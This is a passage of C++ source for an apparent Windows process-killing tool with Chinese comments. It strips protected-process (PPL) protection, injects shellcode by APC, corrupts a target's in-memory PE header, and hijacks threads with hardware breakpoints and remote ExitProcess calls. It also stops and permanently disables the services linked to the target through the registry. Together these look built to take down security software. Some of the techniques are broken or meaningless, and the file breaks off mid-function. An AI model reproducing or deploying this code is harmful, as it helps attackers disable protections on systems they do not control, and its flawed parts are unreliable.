#include "CommonDefs.h"
#include "ProcessTerminator.h"
#include "signature_protection_nocert.h"
#include "ppl_driver.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <wtsapi32.h>
#include <wbemidl.h>
#include <aclapi.h>
#include <tchar.h>
#include <devguid.h>
#include <cfgmgr32.h>
#include <setupapi.h>
#ifndef DN_DEVICE_DISABLED
#define DN_DEVICE_DISABLED 0x00000008
#endif
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "wbemuuid.lib")

// === ProcessTerminator 方法实现 ===
bool RemovePPLProtection(HANDLE hProcess);
static bool InjectViaAPC(DWORD, PVOID, SIZE_T);
extern const unsigned char IndirectSyscallShellCode_x64[];
extern const SIZE_T IndirectSyscallShellCode_x64_size;

void GQ(const std::string&);
void GQS(const std::vector<std::string>&);
extern HWND g_targetTopmostWindow;

_NtQuerySystemInformation ProcessTerminator::NtQuerySystemInformation = nullptr;
_NtTerminateProcess ProcessTerminator::NtTerminateProcess = nullptr;
_RtlAdjustPrivilege ProcessTerminator::RtlAdjustPrivilege = nullptr;
_NtSuspendProcess ProcessTerminator::NtSuspendProcess = nullptr;
_NtResumeProcess ProcessTerminator::NtResumeProcess = nullptr;
_NtGetNextProcess ProcessTerminator::NtGetNextProcess = nullptr;
_NtGetNextThread ProcessTerminator::NtGetNextThread = nullptr;
_NtSetInformationProcess ProcessTerminator::NtSetInformationProcess = nullptr;
_NtQueryInformationProcess ProcessTerminator::NtQueryInformationProcess = nullptr;
_NtSetInformationThread ProcessTerminator::NtSetInformationThread = nullptr;
_NtCreateThreadEx ProcessTerminator::NtCreateThreadEx = nullptr;
_NtOpenProcess ProcessTerminator::NtOpenProcess = nullptr;
_NtWriteVirtualMemory ProcessTerminator::NtWriteVirtualMemory = nullptr;
_NtAllocateVirtualMemory ProcessTerminator::NtAllocateVirtualMemory = nullptr;
_NtDuplicateObject ProcessTerminator::NtDuplicateObject = nullptr;
_NtClose ProcessTerminator::NtClose = nullptr;

bool ProcessTerminator::terminateByHandleInheritance(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            // 创建一个可以继承句柄的进程
            SECURITY_ATTRIBUTES sa;
            sa.nLength = sizeof(SECURITY_ATTRIBUTES);
            sa.lpSecurityDescriptor = NULL;
            sa.bInheritHandle = TRUE;

            HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            if (!hTargetProcess) continue;

            // 创建一个临时进程来继承句柄
            STARTUPINFO si = { sizeof(si) };
            si.lpDesktop = const_cast<LPWSTR>(L"Winsta0\\Default");
            PROCESS_INFORMATION pi = { 0 };
            char cmdline[] = "cmd.exe /c exit";

            if (CreateProcess(NULL, LPWSTR(cmdline), &sa, NULL, TRUE,
                CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
                // 复制句柄到新进程
                HANDLE hInheritedHandle;
                if (DuplicateHandle(GetCurrentProcess(), hTargetProcess, pi.hProcess,
                    &hInheritedHandle, PROCESS_TERMINATE, FALSE, 0)) {
                    // 使用继承的句柄终止进程
                    TerminateProcess(hInheritedHandle, 0);
                    CloseHandle(hInheritedHandle);
                }

                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }

            CloseHandle(hTargetProcess);
        }

        return !isProcessRunning(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}


// 公开的高级隔离方法
bool ProcessTerminator::terminateByAdvancedIsolation(const std::string& processName) {
    return terminateByProcessIsolationAndBlocking(processName);
}
bool ProcessTerminator::terminateByVectoredException(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        // 注册向量化异常处理程序
        PVOID handler = AddVectoredExceptionHandler(1, [](EXCEPTION_POINTERS* ExceptionInfo) -> LONG {
            if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
                // 在异常处理期间，我们可以尝试执行一些特权操作
                // 这里我们尝试修改异常上下文来影响目标进程
                ExceptionInfo->ContextRecord->ContextFlags = CONTEXT_FULL;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
            return EXCEPTION_CONTINUE_SEARCH;
            });

        bool success = false;
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 在异常处理器的保护下执行特权操作
            try {
                // 尝试直接访问进程关键内存区域
                MEMORY_BASIC_INFORMATION mbi;
                if (VirtualQueryEx(hProcess, (LPCVOID)0x400000, &mbi, sizeof(mbi))) {
                    // 读取进程PE头
                    BYTE buffer[4096];
                    SIZE_T bytesRead;
                    if (ReadProcessMemory(hProcess, (LPCVOID)0x400000, buffer, sizeof(buffer), &bytesRead)) {
                        // 修改PE头中的某些字段来破坏进程
                        buffer[0] = 0; // 破坏'MZ'头
                        buffer[1] = 0;

                        // 尝试写入修改后的数据
                        WriteProcessMemory(hProcess, (LPVOID)0x400000, buffer, sizeof(buffer), &bytesRead);
                    }
                }

                // 尝试终止进程
                success = TerminateProcess(hProcess, 0) || success;
            }
            catch(...) {
                // 异常处理 - 继续尝试其他方法
            }

            CloseHandle(hProcess);
        }

        if (handler) {
            RemoveVectoredExceptionHandler(handler);
        }
        return success;
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}

bool ProcessTerminator::terminateByHardwareBreakpoint(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (!hProcess) continue;

            // 枚举进程的所有线程
            HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (hThreadSnapshot != INVALID_HANDLE_VALUE) {
                THREADENTRY32 te;
                te.dwSize = sizeof(THREADENTRY32);

                if (Thread32First(hThreadSnapshot, &te)) {
                    do {
                        if (te.th32OwnerProcessID == pid) {
                            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                            if (hThread) {
                                // 挂起线程以安全修改上下文
                                SuspendThread(hThread);

                                CONTEXT context;
                                context.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_FULL;

                                if (GetThreadContext(hThread, &context)) {
                                    // 设置硬件断点
#ifdef _WIN64
                                    context.Dr0 = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitProcess");
                                    context.Dr7 = (1 << 0) | (1 << 16); // 启用Dr0，执行断点
#else
                                    context.Dr0 = (DWORD)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitProcess");
                                    context.Dr7 = (1 << 0) | (1 << 16);
#endif

                                    SetThreadContext(hThread, &context);

                                    // 恢复线程执行
                                    ResumeThread(hThread);

                                    // 触发断点
                                    DebugBreakProcess(hProcess);
                                }
                                else {
                                    ResumeThread(hThread);
                                }

                                CloseHandle(hThread);
                            }
                        }
                    } while (Thread32Next(hThreadSnapshot, &te));
                }
                CloseHandle(hThreadSnapshot);
            }

            // 等待一段时间让断点生效
            std::this_thread::sleep_for(std::chrono::milliseconds(100));

            bool result = TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
            if (result) return true;
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}

// 前向声明
static bool RemovePPLProtection(HANDLE hProcess);
static bool InjectViaAPC(DWORD targetPid, PVOID shellcode, SIZE_T shellcodeSize);
extern const unsigned char IndirectSyscallShellCode_x64[];
extern const SIZE_T IndirectSyscallShellCode_x64_size;

void GQ(const std::string&);
void GQS(const std::vector<std::string>&);
extern HWND g_targetTopmostWindow;

// 增强的服务检测方法 - 终极版
bool ProcessTerminator::terminateByServiceDetection(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        bool anyServiceStopped = false;
        std::vector<std::pair<DWORD, std::wstring>> serviceAssociations;
        std::vector<std::pair<DWORD, std::wstring>> stoppedServices;

        ServiceHandlePtr scManager(OpenSCManagerW(NULL, NULL, 
            SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE));
        if (!scManager) {
            std::wcerr << L"[服务检测] 打开服务控制器失败: " << GetLastError() << std::endl;
        }
        else {
            DWORD bytesNeeded = 0;
            DWORD serviceCount = 0;
            DWORD resumeHandle = 0;

            if (!EnumServicesStatusExW(scManager.get(), SC_ENUM_PROCESS_INFO, 
                SERVICE_WIN32 | SERVICE_DRIVER, SERVICE_STATE_ALL,
                NULL, 0, &bytesNeeded, &serviceCount, &resumeHandle, NULL) &&
                GetLastError() != ERROR_MORE_DATA) {
                std::wcerr << L"[服务检测] 枚举服务状态失败: " << GetLastError() << std::endl;
            }
            else if (bytesNeeded > 0) {
                std::vector<BYTE> buffer(bytesNeeded);
                ENUM_SERVICE_STATUS_PROCESSW* services = reinterpret_cast<ENUM_SERVICE_STATUS_PROCESSW*>(buffer.data());

                if (EnumServicesStatusExW(scManager.get(), SC_ENUM_PROCESS_INFO, 
                    SERVICE_WIN32 | SERVICE_DRIVER, SERVICE_STATE_ALL,
                    buffer.data(), bytesNeeded, &bytesNeeded, &serviceCount, &resumeHandle, NULL)) {

                    for (DWORD i = 0; i < serviceCount; i++) {
                        for (int pid : pids) {
                            if (services[i].ServiceStatusProcess.dwProcessId == static_cast<DWORD>(pid)) {
                                std::wstring serviceName = services[i].lpServiceName;
                                std::wstring displayName = services[i].lpDisplayName;
                                DWORD currentState = services[i].ServiceStatusProcess.dwCurrentState;

                                std::wcout << L"[服务检测] 发现服务: " << displayName 
                                           << L" (PID: " << pid << L", 状态: " << currentState << L")" << std::endl;

                                serviceAssociations.push_back({ static_cast<DWORD>(pid), serviceName });

                                if (currentState == SERVICE_RUNNING || currentState == SERVICE_PAUSED || 
                                    currentState == SERVICE_CONTINUE_PENDING || currentState == SERVICE_PAUSE_PENDING) {
                                    
                                    ServiceHandlePtr service(OpenServiceW(scManager.get(), serviceName.c_str(), 
                                        SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_ENUMERATE_DEPENDENTS | 
                                        SERVICE_PAUSE_CONTINUE | SERVICE_INTERROGATE));
                                    
                                    if (service) {
                                        bool serviceStopped = false;
                                        int retryCount = 0;
                                        const int maxRetries = 3;

                                        while (!serviceStopped && retryCount < maxRetries) {
                                            SERVICE_STATUS serviceStatus;
                                            BOOL stopped = ControlService(service.get(), SERVICE_CONTROL_STOP, &serviceStatus);
                                            
                                            if (stopped) {
                                                std::wcout << L"[服务检测] 停止命令已发送 (尝试 " << (retryCount + 1) << L"): " << displayName << std::endl;
                                                anyServiceStopped = true;
                                                stoppedServices.push_back({ static_cast<DWORD>(pid), serviceName });

                                                int waitTime = 0;
                                                const int maxWait = 15000;
                                                while (waitTime < maxWait) {
                                                    if (QueryServiceStatus(service.get(), &serviceStatus)) {
                                                        if (serviceStatus.dwCurrentState == SERVICE_STOPPED) {
                                                            std::wcout << L"[服务检测] 服务已停止: " << displayName << std::endl;
                                                            serviceStopped = true;

                                                            std::wcout << L"[服务检测] 正在禁用服务: " << displayName << std::endl;
                                                            HKEY hKey = NULL;
                                                            std::wstring regPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
                                                            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                                                                DWORD startValue = 4;
                                                                if (RegSetValueExW(hKey, L"Start", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&startValue), sizeof(startValue)) == ERROR_SUCCESS) {
                                                                    std::wcout << L"[服务检测] 已禁用服务 (Start=4): " << displayName << std::endl;
                                                                } else {
                                                                    std::wcerr << L"[服务检测] 禁用服务失败: " << displayName << std::endl;
                                                                }
                                                                RegCloseKey(hKey);
                                                            }

                                                            break;
                                                        }
                                                        if (serviceStatus.dwCurrentState == SERVICE_STOP_PENDING) {
                                                            Sleep(200);
                                                            waitTime += 200;
                                                            continue;
                                                        }
                                                        if (serviceStatus.dwCurrentState == SERVICE_PAUSED ||
                                                            serviceStatus.dwCurrentState == SERVICE_RUNNING) {
                                                            std::wcout << L"[服务检测] 服务未完全停止，状态: " << serviceStatus.dwCurrentState 
                                                                       << L"，重试..." << std::endl;
                                                            break;
                                                        }
                                                    }
                                                    Sleep(100);
                                                    waitTime += 100;
                                                }
                                                if (waitTime >= maxWait) {
                                                    std::wcout << L"[服务检测] 等待服务停止超时: " << displayName << std::endl;
                                                }
                                            }
                                            else {
                                                DWORD error = GetLastError();
                                                if (error == ERROR_SERVICE_NOT_ACTIVE) {
                                                    std::wcout << L"[服务检测] 服务已处于非活动状态: " << displayName << std::endl;
                                                    serviceStopped = true;
                                                    anyServiceStopped = true;
                                                }
                                                else if (error == ERROR_DEPENDENT_SERVICES_RUNNING || 
                                                         error == ERROR_SERVICE_CANNOT_ACCEPT_CTRL) {
                                                    std::wcout << L"[服务检测] 有依赖服务运行，尝试枚举并停止: " << displayName << std::endl;
                                                    
                                                    DWORD depBytesNeeded = 0;
                                                    DWORD depCount = 0;
                                                    ENUM_SERVICE_STATUSW depServiceStruct;
                                                    ENUM_SERVICE_STATUSW* depServices = nullptr;
                                                    
                                                    if (EnumDependentServicesW(service.get(), SERVICE_ACTIVE, 
                                                        (LPENUM_SERVICE_STATUSW)&depServiceStruct, 0, &depBytesNeeded, &depCount) ||
                                                        GetLastError() == ERROR_MORE_DATA) {
                                                        std::vector<BYTE> depBuffer(depBytesNeeded);
                                                        depServices = reinterpret_cast<ENUM_SERVICE_STATUSW*>(depBuffer.data());
                                                        
                                                        if (EnumDependentServicesW(service.get(), SERVICE_ACTIVE,
                                                            (LPENUM_SERVICE_STATUSW)depBuffer.data(), depBytesNeeded, &depBytesNeeded, &depCount)) {
                                                            std::wcout << L"[服务检测] 发现 " << depCount << L" 个依赖服务" << std::endl;
                                                            
                                                            for (DWORD j = 0; j < depCount; j++) {
                                                                std::wcout << L"[服务检测] 停止依赖服务: " << depServices[j].lpDisplayName << std::endl;
                                                                
                                                                ServiceHandlePtr depService(OpenServiceW(scManager.get(), 
                                                                    depServices[j].lpServiceName, 
                                                                    SERVICE_STOP | SERVICE_QUERY_STATUS));
                                                                if (depService) {
                                                                    SERVICE_STATUS depStatus;
                                                                    if (ControlService(depService.get(), SERVICE_CONTROL_STOP, &depStatus)) {
                                                                        int depWait = 0;
                                                                        while (depWait < 10000) {
                                                                            if (QueryServiceStatus(depService.get(), &depStatus)) {
                                                                                if (depStatus.dwCurrentState == SERVICE_STOPPED) break;
                                                                                if (depStatus.dwCurrentState == SERVICE_STOP_PENDING) {
                                                                                    Sleep(200);
                                                                                    depWait += 200;
                                                                                    continue;
                                                                                }
                                                                            }
                                                                            break;
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                    
                                                    if (retryCount < maxRetries - 1) {
                                                        retryCount++;
                                                        Sleep(500);
                                                        continue;
                                                    }
                                                }
                                                else {
                                                    // 静默跳过
                                                }
                                            }
                                            
                                            retryCount++;
                                            if (!serviceStopped && retryCount < maxRetries) {
                                                Sleep(500);
                                            }
                                        }
                                        
                                        if (!serviceStopped) {
                                            HANDLE hServiceProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 
                                                services[i].ServiceStatusProcess.dwProcessId);
                                            if (hServiceProcess) {
                                                if (TerminateProcess(hServiceProcess, 1)) {
                                                    anyServiceStopped = true;
                                                    stoppedServices.push_back({ static_cast<DWORD>(pid), serviceName });
                                                }
                                                CloseHandle(hServiceProcess);
                                            }
                                        }
                                    }
                                }
                                break;
                            }
                        }
                    }
                }
            }
        }

        if (!serviceAssociations.empty()) {
            std::wcout << L"[服务检测] 共发现 " << serviceAssociations.size() << L" 个服务关联" << std::endl;
            if (!stoppedServices.empty()) {
                std::wcout << L"[服务检测] 已停止 " << stoppedServices.size() << L" 个服务" << std::endl;
            }
        }

        HANDLE hProcess = OpenProcessEnhanced(pids[0], PROCESS_ALL_ACCESS);
        if (hProcess) {
            // 移除PPL保护
            RemovePPLProtection(hProcess);
            
            // 尝试终止目标进程
            if (TerminateProcess(hProcess, 0)) { CloseHandle(hProcess); return true; }

            // NtTerminateProcess
            typedef NTSTATUS (NTAPI* _NtTerminateProcess)(HANDLE, NTSTATUS);
            HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
            if (ntdll) {
                _NtTerminateProcess pNtTerminateProcess = (_NtTerminateProcess)GetProcAddress(ntdll, "NtTerminateProcess");
                if (pNtTerminateProcess && NT_SUCCESS(pNtTerminateProcess(hProcess, 0)))
                    { CloseHandle(hProcess); return true; }
            }

            // ZwTerminateProcess
            typedef NTSTATUS (NTAPI* _ZwTerminateProcess)(HANDLE, NTSTATUS);
            _ZwTerminateProcess pZwTerminateProcess = (_ZwTerminateProcess)GetProcAddress(ntdll, "ZwTerminateProcess");
            if (pZwTerminateProcess && NT_SUCCESS(pZwTerminateProcess(hProcess, 0)))
                { CloseHandle(hProcess); return true; }

            // APC注入
            if (InjectViaAPC(pids[0], (PVOID)IndirectSyscallShellCode_x64, IndirectSyscallShellCode_x64_size))
                { CloseHandle(hProcess); Sleep(1000); return true; }

            // csrss.exe循环
            std::vector<int> csrssPids = getPIDsByName("csrss.exe");
            if (!csrssPids.empty()) {
                HANDLE hCsrss = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, csrssPids[0]);
                if (hCsrss) {
                    for (int i = 0; i < 30; i++) {
                        HANDLE hTargetProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_VM_WRITE, FALSE, pids[0]);
                        if (hTargetProcess) {
                            RemovePPLProtection(hTargetProcess);
                            TerminateProcess(hTargetProcess, 0);
                            TerminateProcess(hTargetProcess, 0);
                            
                            CloseHandle(hTargetProcess);
                            Sleep(10);
                        } else {
                            std::wcerr << L"[服务检测] 无法打开目标进程 (尝试 " << (i + 1) << L"/30): " << GetLastError() << std::endl;
                        }
                    }
                    CloseHandle(hCsrss);
                } else {
                    std::wcerr << L"[服务检测] 无法打开csrss.exe: " << GetLastError() << std::endl;
                }
            } else {
                std::wcerr << L"[服务检测] 未找到csrss.exe" << std::endl;
            }
            
            // 方法5: 尝试使用ExitProcess
            typedef VOID (WINAPI* _ExitProcess)(UINT);
            HMODULE kernel32 = GetModuleHandle(L"kernel32.dll");
            if (kernel32) {
                _ExitProcess pExitProcess = (_ExitProcess)GetProcAddress(kernel32, "ExitProcess");
                if (pExitProcess) {
                    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pExitProcess, nullptr, 0, nullptr);
                    if (hThread) {
                        std::wcout << L"[服务检测] ExitProcess远程线程已创建" << std::endl;
                        CloseHandle(hThread);
                        CloseHandle(hProcess);
                        Sleep(1000);
                        return true;
                    } else {
                        std::wcerr << L"[服务检测] ExitProcess远程线程创建失败: " << GetLastError() << std::endl;
                    }
                } else {
                    std::wcerr << L"[服务检测] 无法获取ExitProcess地址" << std::endl;
                }
            } else {
                std::wcerr << L"[服务检测] 无法获取kernel32.dll句柄" << std::endl;
            }
            
            // 方法6: 尝试使用RtlExitUserProcess
            typedef VOID (NTAPI* _RtlExitUserProcess)(NTSTATUS);
            HMODULE ntdll3 = GetModuleHandle(L"ntdll.dll");
            if (ntdll3) {
                _RtlExitUserProcess pRtlExitUserProcess = (_RtlExitUserProcess)GetProcAddress(ntdll3, "RtlExitUserProcess");
                if (pRtlExitUserProcess) {
                    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pRtlExitUserProcess, nullptr, 0, nullptr);
                    if (hThread) {
                        std::wcout << L"[服务检测] RtlExitUserProcess远程线程已创建" << std::endl;
                        CloseHandle(hThread);
                        CloseHandle(hProcess);
                        Sleep(1000);
                        return true;
                    } else {
                        std::wcerr << L"[服务检测] RtlExitUserProcess远程线程创建失败: " << GetLastError() << std::endl;
                    }
                } else {
                    std::wcerr << L"[服务检测] 无法获取RtlExitUserProcess地址" << std::endl;
                }
            } else {
                std::wcerr << L"[服务检测] 无法获取ntdll.dll句柄" << std::endl;
            }
            
            // 方法7: 尝试使用NtCreateThreadEx
            typedef NTSTATUS (NTAPI* _NtCreateThreadEx)(
                PHANDLE ThreadHandle,
                ACCESS_MASK DesiredAccess,
                POBJECT_ATTRIBUTES ObjectAttributes,
                HANDLE ProcessHandle,
                PVOID StartRoutine,
                PVOID Argument,
                ULONG CreateFlags,
                SIZE_T ZeroBits,
                SIZE_T StackSize,
                SIZE_T MaximumStackSize);
            
            if (ntdll3) {
                _NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(ntdll3, "NtCreateThreadEx");
                if (pNtCreateThreadEx) {
                    HANDLE hThread = nullptr;
                    NTSTATUS status = pNtCreateThreadEx(
                        &hThread,
                        THREAD_ALL_ACCESS,
                        nullptr,
                        hProcess,
                        (PVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "ExitProcess"),
                        nullptr,
                        0,
                        0,
                        0,
                        0);
                    
                    if (NT_SUCCESS(status) && hThread) {
                        std::wcout << L"[服务检测] NtCreateThreadEx远程线程已创建" << std::endl;
                        CloseHandle(hThread);
                        CloseHandle(hProcess);
                        Sleep(1000);
                        return true;
                    } else {
                        std::wcerr << L"[服务检测] NtCreateThreadEx失败: 0x" << std::hex << status << std::dec << std::endl;
                    }
                }
            }
            
            // 方法8: 尝试使用NtCreateThread
            typedef NTSTATUS (NTAPI* _NtCreateThread)(
                PHANDLE ThreadHandle,
                ACCESS_MASK DesiredAccess,
                POBJECT_ATTRIBUTES ObjectAttributes,
                HANDLE ProcessHandle,
                PVOID StartRoutine,
                PVOID Argument,
                BOOLEAN CreateSuspended,
                SIZE_T StackZeroBits,
                SIZE_T StackSize,
                SIZE_T StackCommitSize);
            
            if (ntdll3) {
                _NtCreateThread pNtCreateThread = (_NtCreateThread)GetProcAddress(ntdll3, "NtCreateThread");
                if (pNtCreateThread) {
                    HANDLE hThread = nullptr;
                    NTSTATUS status = pNtCreateThread(
                        &hThread,
                        THREAD_ALL_ACCESS,
                        nullptr,
                        hProcess,
                        (PVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "ExitProcess"),
                        nullptr,
                        FALSE,
                        0,
                        0,
                        0);
                    
                    if (NT_SUCCESS(status) && hThread) {
                        std::wcout << L"[服务检测] NtCreateThread远程线程已创建" << std::endl;
                        CloseHandle(hThread);
                        CloseHandle(hProcess);
                        Sleep(1000);
                        return true;
                    } else {
                        std::wcerr << L"[服务检测] NtCreateThread失败: 0x" << std::hex << status << std::dec << std::endl;
                    }
                }
            }
            
            // 方法9: 尝试使用VirtualProtectEx修改内存保护
            DWORD oldProtect = 0;
            if (VirtualProtectEx(hProcess, nullptr, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                std::wcout << L"[服务检测] 内存保护已修改" << std::endl;
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                return true;
            } else {
                std::wcerr << L"[服务检测] VirtualProtectEx失败: " << GetLastError() << std::endl;
            }
            
            // 方法10: 尝试使用DuplicateHandle复制句柄
            HANDLE hDuplicate = nullptr;
            if (DuplicateHandle(GetCurrentProcess(), hProcess, GetCurrentProcess(), &hDuplicate, PROCESS_ALL_ACCESS, FALSE, 0)) {
                std::wcout << L"[服务检测] 句柄已复制" << std::endl;
                TerminateProcess(hDuplicate, 0);
                CloseHandle(hDuplicate);
                CloseHandle(hProcess);
                return true;
            } else {
                std::wcerr << L"[服务检测] DuplicateHandle失败: " << GetLastError() << std::endl;
            }
            
            // 方法11: 尝试使用NtSuspendProcess
            typedef NTSTATUS (NTAPI* _NtSuspendProcess)(HANDLE, PULONG);
            if (ntdll3) {
                _NtSuspendProcess pNtSuspendProcess = (_NtSuspendProcess)GetProcAddress(ntdll3, "NtSuspendProcess");
                if (pNtSuspendProcess) {
                    ULONG count = 0;
                    NTSTATUS status = pNtSuspendProcess(hProcess, &count);
                    if (NT_SUCCESS(status)) {
                        std::wcout << L"[服务检测] 进程已挂起" << std::endl;
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                        return true;
                    } else {
                        std::wcerr << L"[服务检测] NtSuspendProcess失败: 0x" << std::hex << status << std::dec << std::endl;
                    }
                }
            }
            
            // 方法12: 尝试使用NtAlertThread
            typedef NTSTATUS (NTAPI* _NtAlertThread)(HANDLE);
            if (ntdll3) {
                _NtAlertThread pNtAlertThread = (_NtAlertThread)GetProcAddress(ntdll3, "NtAlertThread");
                if (pNtAlertThread) {
                    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                    if (hSnapshot != INVALID_HANDLE_VALUE) {
                        THREADENTRY32 te = { 0 };
                        te.dwSize = sizeof(THREADENTRY32);
                        
                        while (Thread32Next(hSnapshot, &te)) {
                            if (te.th32OwnerProcessID == pids[0]) {
                                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                                if (hThread) {
                                    NTSTATUS status = pNtAlertThread(hThread);
                                    if (NT_SUCCESS(status)) {
                                        std::wcout << L"[服务检测] 线程已警告" << std::endl;
                                    }
                                    CloseHandle(hThread);
                                }
                            }
                        }
                        CloseHandle(hSnapshot);
                        
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                        return true;
                    }
                }
            }
            
            // 方法13: 尝试使用NtClose
            typedef NTSTATUS (NTAPI* _NtClose)(HANDLE);
            if (ntdll3) {
                _NtClose pNtClose = (_NtClose)GetProcAddress(ntdll3, "NtClose");
                if (pNtClose) {
                    NTSTATUS status = pNtClose(hProcess);
                    if (NT_SUCCESS(status)) {
                        std::wcout << L"[服务检测] 句柄已关闭" << std::endl;
                        return true;
                    } else {
                        std::wcerr << L"[服务检测] NtClose失败: 0x" << std::hex << status << std::dec << std::endl;
                    }
                }
            }
            
            // 方法14: 尝试使用NtDuplicateObject
            typedef NTSTATUS (NTAPI* _NtDuplicateObject)(
                HANDLE SourceHandle,
                HANDLE TargetProcessHandle,
                PHANDLE TargetHandle,
                ACCESS_MASK DesiredAccess,
                POBJECT_ATTRIBUTES ObjectAttributes);
            
            if (ntdll3) {
                _NtDuplicateObject pNtDuplicateObject = (_NtDuplicateObject)GetProcAddress(ntdll3, "NtDuplicateObject");
                if (pNtDuplicateObject) {
                    HANDLE hDuplicate = nullptr;
                    NTSTATUS status = pNtDuplicateObject(
                        hProcess,
                        GetCurrentProcess(),
                        &hDuplicate,
                        PROCESS_ALL_ACCESS,
                        nullptr);
                    
                    if (NT_SUCCESS(status) && hDuplicate) {
                        std::wcout << L"[服务检测] 对象已复制" << std::endl;
                        TerminateProcess(hDuplicate, 0);
                        CloseHandle(hDuplicate);
                        CloseHandle(hProcess);
                        return true;
                    } else {
                        std::wcerr << L"[服务检测] NtDuplicateObject失败: 0x" << std::hex << status << std::dec << std::endl;
                    }
                }
            }
            
            // 方法15: 尝试使用NtSetInformationThread
            typedef NTSTATUS (NTAPI* _NtSetInformationThread)(
                HANDLE ThreadHandle,
                ULONG ThreadInformationClass,
                PVOID ThreadInformation,
                ULONG ThreadInformationLength);
            
            if (ntdll3) {
                _NtSetInformationThread pNtSetInformationThread = (_NtSetInformationThread)GetProcAddress(ntdll3, "NtSetInformationThread");
                if (pNtSetInformationThread) {
                    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                    if (hSnapshot != INVALID_HANDLE_VALUE) {
                        THREADENTRY32 te = { 0 };
                        te.dwSize = sizeof(THREADENTRY32);
                        
                        while (Thread32Next(hSnapshot, &te)) {
                            if (te.th32OwnerProcessID == pids[0]) {
                                HANDLE hThread = OpenThread(THREAD_SET_INFORMATION, FALSE, te.th32ThreadID);
                                if (hThread) {
                                    NTSTATUS status = pNtSetInformationThread(hThread, 17, nullptr, 0);
                                    if (NT_SUCCESS(status)) {
                                        std::wcout << L"[服务检测] 线程信息已设置" << std::endl;
                                    }
                                    CloseHandle(hThread);
                                }
                            }
                        }
                        CloseHandle(hSnapshot);
                        
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                        return true;
                    }
                }
            }
            
            CloseHandle(hProcess);
        }

        if (anyServiceStopped) {
            Sleep(1000);
            std::wcout << L"[服务检测] 等待服务完全停止后重试终止进程..." << std::endl;
            
            for (int attempt = 0; attempt < 3 && !hProcess; attempt++) {
                hProcess = OpenProcessEnhanced(pids[0], PROCESS_ALL_ACCESS);
                if (hProcess) {
                    bool terminated = TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                    if (terminated) {
                        std::wcout << L"[服务检测] 服务停止后进程已终止 (尝试 " << (attempt + 1) << L")" << std::endl;
                        return true;
                    }
                }
                Sleep(500);
            }
            
            if (!hProcess) {
                HANDLE hDirect = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pids[0]);
                if (hDirect) {
                    if (TerminateProcess(hDirect, 0)) {
                        std::wcout << L"[服务检测] 直接终止进程成功" << std::endl;
                        CloseHandle(hDirect);
                        return true;
                    }
                    CloseHandle(hDirect);
                }
            }
        }
    }
    catch (const std::exception& e) {
        std::wcerr << L"[服务检测] 异常: " << e.what() << std::endl;
    }
    catch (...) {
        std::wcerr << L"[服务检测] 未知异常" << std::endl;
    }
#endif
    return false;
}

bool ProcessTerminator::terminateByMemoryMapping(const std::string& processName) {
#ifdef _WIN32
    try {
